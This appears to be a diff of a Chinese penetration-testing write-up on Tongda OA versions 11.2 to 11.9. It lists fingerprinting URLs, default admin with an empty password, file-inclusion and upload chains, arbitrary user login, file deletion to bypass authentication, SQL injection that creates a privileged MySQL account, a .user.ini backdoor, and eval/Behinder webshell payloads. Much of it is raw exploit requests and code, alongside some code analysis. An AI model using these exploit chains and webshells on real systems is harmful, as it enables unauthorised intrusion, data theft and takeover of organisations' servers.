@@ -1,57 +1,49 @@
-# 通达
+# 通达oa
+- [环境准备](#环境准备)
+- [通达部分漏洞信息整合](#通达部分漏洞信息整合)
+- [全局配置说明](#全局配置说明)
+- [弱口令-全版本通杀](#弱口令-全版本通杀)
+- [通达oa11.2](#通达oa11.2)
+    - [11.2后台-getshell](#11.2后台-getshell)
+- [通达oa11.3](#通达oa11.3)
+    - [环境准备](#环境准备)
+    - [指纹特征-11.3](#指纹特征-11.3)
+    - [审计流程](#审计流程)
+        - [任意文件包含](#任意文件包含)
+			- [总结1](#总结1)
+        - [任意文件上传](#任意文件上传)
+			- [版本路径梳理](#版本路径梳理)
+			- [总结2](#总结2)
+- [通达oa11.x-11.5](#通达oa11.x-11.5)
+	- [任意用户登录](#任意用户登录)
+- [通达oa11.6](#通达oa11.6)
+	- [指纹特征-11.6](#指纹特征-11.6)
+	- [任意文件删除&getshell](#任意文件删除&getshell)
+- [通达oa11.7](#通达oa11.7)
+    - [有效的任意用户登录-管理员在线](#有效的任意用户登录-管理员在线)
+	- [后台SQL注入getshell](#后台SQL注入getshell)
+- [通达oa11.8](#通达oa11.8)
+    - [指纹特征-11.8](#指纹特征-11.8)
+    - [11.8后台getshell](#11.8后台getshell)
+- [通达oa11.9](#通达oa11.9)
+    - [11.9后台sql注入](#11.9后台sql注入)
+- [参考文章](#参考文章)
+## 环境准备
+- [通达oa11.2源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.2.exe)
+- [通达oa11.3源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe)
+- [通达oa11.6源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe)
+- [通达oa11.7源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe)
+- [通达oa11.8源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.8.exe)
+- [通达oa11.9源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe)
+- [PHP免费在线解密](http://dezend.qiling.org/free.html)
+- seayzend解密工具
+- 首先用zend将webroot解密(时间有点长)-该解密工具不完全准确，可以在分析单个文件时再次拿到在线网站解密跑一次。
 
+## 通达部分漏洞信息整合
 
-
-## 通达oa
-
-* 环境准备
-* 通达部分漏洞信息整合
-* 全局配置说明
-* 弱口令-全版本通杀
-* 通达oa11.2
-  * 11.2后台-getshell
-* 通达oa11.3
-  * 环境准备
-  * 指纹特征-11.3
-  * 审计流程
-    * 任意文件包含
-      * 总结1
-    * 任意文件上传
-      * 版本路径梳理
-      * 总结2
-* 通达oa11.x-11.5
-  * 任意用户登录
-* 通达oa11.6
-  * 指纹特征-11.6
-  * 任意文件删除\&getshell
-* 通达oa11.7
-  * 有效的任意用户登录-管理员在线
-  * 后台SQL注入getshell
-* 通达oa11.8
-  * 指纹特征-11.8
-  * 11.8后台getshell
-* 通达oa11.9
-  * 11.9后台sql注入
-* 参考文章
-
-### 环境准备
-
-* [通达oa11.2源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.2.exe)
-* [通达oa11.3源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe)
-* [通达oa11.6源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe)
-* [通达oa11.7源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe)
-* [通达oa11.8源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.8.exe)
-* [通达oa11.9源码](https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe)
-* [PHP免费在线解密](http://dezend.qiling.org/free.html)
-* seayzend解密工具
-* 首先用zend将webroot解密(时间有点长)-该解密工具不完全准确，可以在分析单个文件时再次拿到在线网站解密跑一次。
-
-### 通达部分漏洞信息整合
-
-* https://github.com/OA-HUNTER/TongDa-OA
+- https://github.com/OA-HUNTER/TongDa-OA
 
 通达OA信息收集
-
 ```
 http[s]://TongDaOA.domain/inc/expired.php 判断通达版本
 http[s]://TongDaOA.domain/inc/reg_trial.php
@@ -62,7 +54,6 @@ http[s]://TongDaOA.domain/resque/worker.php 计算机名
 ```
 
 2013-2017(SQLi path)
-
 ```
 http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php 
 http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php 
@@ -90,8 +81,7 @@ http[s]://TongDaOA.domain/ispirit/myoa.php
 http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php
 ```
 
-v11\~v11.6 \[0day]
-
+v11~v11.6 [0day]
 ```
 http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php
 http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php
@@ -110,13 +100,12 @@ http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly
 http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php
 ```
 
-v11.6 \[RCE]
-
+v11.6 [RCE]
 ```
 http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除
 ```
 
-### 全局配置说明
+## 全局配置说明
 
 首先是通用文件，整个OA的大部分文件都会引用`inc/utility*`多个文件，里面涉及到了所有OA的通用函数以及一些全局处理、配置文件等。
 
@@ -128,13 +117,15 @@ http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除
 
 除了这个以外，在前一篇文章我提到过，通达OA关于文件上传相关的配置非常完善。首先是建了attachment作为附件目录，正常的文件上传都会传到这里。
 
-### 弱口令-全版本
+## 弱口令-全版本
 
 初始账号为admin，密码为空。
 
-### 通达oa11.2
+![image](./img/tongda11.3_2.png)
 
-### 11.2后台-getshell
+## 通达oa11.2
+
+## 11.2后台-getshell
 
 **漏洞复现**
 
@@ -142,27 +133,41 @@ admin/空密码
 
 系统管理->附件管理->添加存储目录
 
+![image](./img/tongda11.2_1.png)
+
 在系统管理->系统参数信息->OA服务设置可以看到webroot目录
+
+![image](./img/tongda11.2_2.png)
 
 回到刚才的添加存储目录，我写的`C:/MYOA/webroot`
 
+![image](./img/tongda11.2_3.png)
+
 组织->综合管理部->系统管理员->上传
+
+![image](./img/tongda11.2_4.png)
 
 php被限制上传，但可以利用windows特性点号绕过，刚开始我上传的是简单的一句话木马，但失败了，发现是win10病毒威胁拦截了，于是换了冰蝎木马成功上传。
 
+![image](./img/tongda11.2_5.png)
+
 上传地址：`http://10.30.1.52/im/2106/1547210396.hello.php` 连接即可。
 
-### 通达oa11.3
 
-### 指纹特征-11.3
+## 通达oa11.3
+
+## 指纹特征-11.3
+
+![image](./img/tongda11.3.png)
 
 `body="/static/templates/2020_year_01/logo.png"`
 
 后台在最下面一栏可以看到版本号
 
-### 审计流程
+## 审计流程
 
-### 任意文件包含
+
+## 任意文件包含
 
 **漏洞复现**
 
@@ -176,6 +181,9 @@ POST /ispirit/interface/gateway.php HTTP/1.1
 
 json={"url":"/general/../../mysql5/my.ini"}
 ```
+
+![image](./img/tongda11.3_3.png)
+
 
 **代码分析**
 
@@ -212,7 +220,6 @@ if ($json) {
 ```
 
 关键代码：
-
 ```php
 		if ((strpos($url, "general/") !== false) || (strpos($url, "ispirit/") !== false) || (strpos($url, "module/") !== false)) {
 			include_once $url;
@@ -235,20 +242,19 @@ if (0 < count($_POST)) {
             ${$s_key} = $_POST[$s_key];
 ```
 
-典型的二次变量覆盖漏洞，$json就是从这里来的，同样地也可以通过$\_GET去赋值。
+典型的二次变量覆盖漏洞，$json就是从这里来的，同样地也可以通过$_GET去赋值。
 
-## 总结1
 
-* 猜测传参方式
-  * 其他文件A通过包含这个文件，然后A中有$json这个参数的获取方式。
-  * 因为这个文件头部有include，所以猜测本文件的开头include的文件会存在$json参数的获取。
+# 总结1
+- 猜测传参方式
+    - 其他文件A通过包含这个文件，然后A中有$json这个参数的获取方式。
+    - 因为这个文件头部有include，所以猜测本文件的开头include的文件会存在$json参数的获取。
 
-### 任意文件上传
+## 任意文件上传
 
 **漏洞复现**
 
-* 需要结合前面的文件包含getshell
-
+- 需要结合前面的文件包含getshell
 ```
 POST /ispirit/im/upload.php HTTP/1.1
 Host: 10.30.1.53
@@ -284,6 +290,9 @@ fclose($fp);
 ------WebKitFormBoundaryBwVAwV3O4sifyhr3--
 ```
 
+![image](./img/tongda11.3_4.png)
+
+
 ```
 POST /ispirit/interface/gateway.php HTTP/1.1
 ...
@@ -291,9 +300,12 @@ POST /ispirit/interface/gateway.php HTTP/1.1
 json={"url":"/general/../../attach/im/2106/1627359439.jpg"}
 ```
 
-* 冰蝎马，密码为rebeyond
-* http://xxxxxx/ispirit/interface/haha.php
+![image](./img/tongda11.3_5.png)
 
+![image](./img/tongda11.3_6.png)
+
+- 冰蝎马，密码为rebeyond
+- http://xxxxxx/ispirit/interface/haha.php
 ```php
 <?php
 $fp = fopen('haha.php', 'w');
@@ -305,8 +317,7 @@ fclose($fp);
 
 **代码分析**
 
-* ispirit/im/upload.php
-
+- ispirit/im/upload.php
 ```php
 <?php
 
@@ -326,21 +337,21 @@ else {
 
 分析这一段可知，只要p不为空就会跳过auth认证，从而继续执行后续的上传代码，在新的补丁中是将else删掉的。继续分析下面的代码：
 
-上述代码可以看到，一共传了4个表单参数，分别是UPLOAD\_MODE、P、DESTUID、ATTACHMENT
+上述代码可以看到，一共传了4个表单参数，分别是UPLOAD_MODE、P、DESTUID、ATTACHMENT
+
+![image](./img/tongda11.3_7.png)
 
 前面是对参数的判断，从图中可知上传的变量为ATTACHMENT，upload函数里是对一些检查如黑名单检测，但不影响我们上传jpg格式的PHP代码，再去文件包含即可。
 
-### 版本路径梳理
+## 版本路径梳理
 
 V11 / 2013：
-
 ```
 文件上传路径：http://172.16.33.136/ispirit/im/upload.php
 文件包含路径：http://172.16.33.136/ispirit/interface/gateway.php
 ```
 
 2017
-
 ```
 文件上传路径：http://172.16.33.136/ispirit/im/upload.php
 文件包含路径：http://172.16.33.136/mac/gateway.php
@@ -353,39 +364,49 @@ V11 / 2013：
 
 文件上传漏洞全版本覆盖，文件包含仅V11.3版本存在。
 
-### 总结2
+## 总结2
 
 文件上传需要结合文件包含利用，且文件包含只有11.3版本才会有。
 
-### 通达oa11.x-11.5
+## 通达oa11.x-11.5
 
-### 任意用户登录
+## 任意用户登录
 
 这里可以利用工具获取cookie，但这里尝试手工熟悉一下。
 
 **影响版本**
 
-* 通达OA2017
-* V11.x \~ V11.5
+- 通达OA2017
+- V11.x ~ V11.5
 
 **漏洞复现**
+
+![image](./img/tongda11.3_8.png)
+
+![image](./img/tongda11.3_9.png)
 
 1. Cookie删掉
 2. POST再增加`UID=1`
 3. POST地址为`logincheck_code.php`
 4. 获取PHPSESSION后访问/general/index.php并添加上去`PHPSESSID=a8bbv8918lt05eo058dgr9f7v7`,我这里用插件Cookie Editor来维持权限。
 
-### 通达oa11.6
 
-### 指纹特征-11.6
+## 通达oa11.6
+
+## 指纹特征-11.6
+
+![image](./img/tongda11.6_1.png)
 
 `body="/static/templates/2019_01/login_bg.png?2019"`
 
 后台在最下面一栏可以看到版本号
 
-### 任意文件删除\&getshell
+![image](./img/tongda11.6_2.png)
 
-* 该洞有风险，切勿在公网上使用
+
+## 任意文件删除&getshell
+
+- 该洞有风险，切勿在公网上使用
 
 **漏洞利用**
 
@@ -410,15 +431,17 @@ else {
 }
 ```
 
-可以看到可控变量guid被拼接到`$s_tmp`里，file\_exists判断`$s_tmp`文件是否存在，存在则赋值给`$arr_data`然后unlink删掉。从而造成任意文件删除漏洞。通过此漏洞来删除/webroot/inc/auth.inc.php的认证文件，从而达到未授权上传。
+可以看到可控变量guid被拼接到`$s_tmp`里，file_exists判断`$s_tmp`文件是否存在，存在则赋值给`$arr_data`然后unlink删掉。从而造成任意文件删除漏洞。通过此漏洞来删除/webroot/inc/auth.inc.php的认证文件，从而达到未授权上传。
+
+![image](./img/tongda11.6_3.png)
 
 上传点在`general\data_center\utils\upload.php`文件，可以看到包含了`auth.inc.php`认证文件，任意删除就是删除这个文件来执行后续的上传操作的。
 
 具体POC暂不写，有风险。
 
-### 通达oa11.7
+## 通达oa11.7
 
-### 有效的任意用户登录-管理员在线
+## 有效的任意用户登录-管理员在线
 
 **漏洞利用**
 
@@ -432,19 +455,23 @@ xinyun跑了一下只有poc5能利用成功，分析一下poc5
 
 这种洞一般很难利用。成功率不大。
 
+
 **代码分析**
 
 漏洞点在`mobile\auth_mobi.php`
+
+![image](./img/tongda11.7_9.png)
 
 这是11.7与11.8的对比图。
 
 分析左边代码可知，`$uid`参数带入数据库查询，返回`$p= $row["SID"]`，然后下面判断$P是否为空，则relogin重新登陆。也就是说我们通过遍历uid当前所有在线账户。
 
-### 后台SQL注入getshell
+## 后台SQL注入getshell
 
 **漏洞复现**
 
-在`/general/hr/manage/query/delete_cascade.php该文件的`condition\_cascade\`参数存在 布尔盲注。
+在`/general/hr/manage/query/delete_cascade.php该文件的`condition_cascade`参数存在
+布尔盲注。
 
 ```
 GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99)) HTTP/1.1
@@ -455,25 +482,33 @@ Host: 10.30.1.53
 
 `grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION`
 
-1. 添加的账户不能直接通过日志慢查询写入文件，需要给创建的账户添加权限
+![image](./img/tongda11.7_1.png)
+
+2. 添加的账户不能直接通过日志慢查询写入文件，需要给创建的账户添加权限
 
 ```
 UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('at666' AS Binary(5));
 ```
 
-1. 直接用注入点刷新权限，因为at666没有刷新权限，需要在后台刷新。
+![image](./img/tongda11.7_2.png)
 
+3. 直接用注入点刷新权限，因为at666没有刷新权限，需要在后台刷新。
 ```
 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;
 ```
 
-1. 再次回到navicat，提示密码过期，需要重新执行命令。
+![image](./img/tongda11.7_3.png)
+
+4. 再次回到navicat，提示密码过期，需要重新执行命令。
 
 ```
 grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
 ```
 
-1. 最后开始写shell(antsword连接时需要cookie)
+![image](./img/tongda11.7_4.png)
+
+
+5. 最后开始写shell(antsword连接时需要cookie)
 
 ```php
 ## 方法一
@@ -498,11 +533,18 @@ select '<?php eval($_POST[x]);?>';
 show variables like '%general%';
 ```
 
+![image](./img/tongda11.7_5.png)
+
+
 **代码分析**
 
 漏洞点在`general/hr/manage/query/delete_cascade.php`
 
-判断condition\_cascade参数不为空的话则将`\'`替换为`'`,这一替换原因是在`common.inc.php`有对全局变量的一个addslashes过滤函数。通达oa的过滤机制在`inc/conn.php`如下：
+![image](./img/tongda11.7_6.png)
+
+判断condition_cascade参数不为空的话则将`\'`替换为`'`,这一替换原因是在`common.inc.php`有对全局变量的一个addslashes过滤函数。通达oa的过滤机制在`inc/conn.php`如下：
+
+![image](./img/tongda11.7_7.png)
 
 但盲注核心是:substr、if等函数，未被过滤，这里用if盲注来判断报错信息
 
@@ -510,22 +552,21 @@ show variables like '%general%';
 
 这里字符串相等时不报错，不等的时候会报错。
 
-### 通达oa11.8
+![image](./img/tongda11.7_8.png)
 
-### 指纹特征-11.8
+## 通达oa11.8
 
+## 指纹特征-11.8
 前台特征没啥变化，跟前几个版本一样。
 
 访问inc/expired.php可看出版本
-
-### 11.8后台getshell
+## 11.8后台getshell
 
 **漏洞复现**
 
 思路是，先上传.user.ini来使它包含一个日志文件，再上传这个日志文件，内容为一句话木马，最后访问当前目录的php文件getshell。原理是user.ini后门。
 
 上传.user.ini文件
-
 ```php
 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general\reportshop\workshop\report\attachment-remark/.user HTTP/1.1
 Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
@@ -543,10 +584,11 @@ Content-Disposition: form-data; name="submit"
 -----------------------------17518323986548992951984057104--
 ```
 
+![image](./img/tongda11.8_2.png)
+
 可以看到写入了`.user`文件，内容为`auto_prepend_file=1.log`。
 
 上传1.log文件
-
 ```php
 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general\reportshop\workshop\report\attachment-remark/1 HTTP/1.1
 Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
@@ -588,13 +630,21 @@ Content-Disposition: form-data; name="submit"
 -----------------------------17518323986548992951984057104--
 ```
 
+![image](./img/tongda11.8_3.png)
+
 最后用冰蝎连接，需要添加请求头，如图：
+
+![image](./img/tongda11.8_4.png)
+
+![image](./img/tongda11.8_5.png)
 
 注意点：修改.user.ini并不是即时生效的，一般来说需要等待一会儿即可。
 
 **代码分析**
 
 漏洞点:`/general/hr/manage/staff_info/update.php`
+
+![image](./img/tongda11.8_1.png)
 
 `$USER_ID`可控，拼接到$FILENAME参数后带到文件上传
 
@@ -704,11 +754,12 @@ if __name__ == '__main__':
     Upload_Ini(target_url,cookie)
 ```
 
-### 通达oa11.9
+## 通达oa11.9
 
-### 11.9后台sql注入
+## 11.9后台sql注入
 
 **漏洞复现**
+
 
 ```
 POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1
@@ -732,13 +783,17 @@ uid=1&status=1&id=1;select sleep(4)
 python sqlmap.py -r 1.txt -p id -risk 3 -level 5 -dbms=MYSQL
 ```
 
+![image](./img/tongda11.9_2.png)
+
 漏洞点`webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php`
+
+![image](./img/tongda11.9_1.png)
 
 涉及到框架MVC了有点难看懂，先搁置。
 
-### 参考文章
 
-* [通达 OA 代码审计篇二 ：11.8 后台 Getshell](https://lorexxar.cn/2021/03/09/tongda11-8/)
-* [通达OA综合利用工具\_v1.0](https://github.com/xinyu2428/TDOA\_RCE)
-* [红队中的一些重点系统漏洞整理](https://github.com/r0eXpeR/redteam\_vul)
-* [user.ini文件构成的PHP后门|离别歌](https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html)
+## 参考文章
+- [通达 OA 代码审计篇二 ：11.8 后台 Getshell](https://lorexxar.cn/2021/03/09/tongda11-8/)
+- [通达OA综合利用工具_v1.0](https://github.com/xinyu2428/TDOA_RCE)
+- [红队中的一些重点系统漏洞整理](https://github.com/r0eXpeR/redteam_vul)
+- [user.ini文件构成的PHP后门|离别歌](https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html)
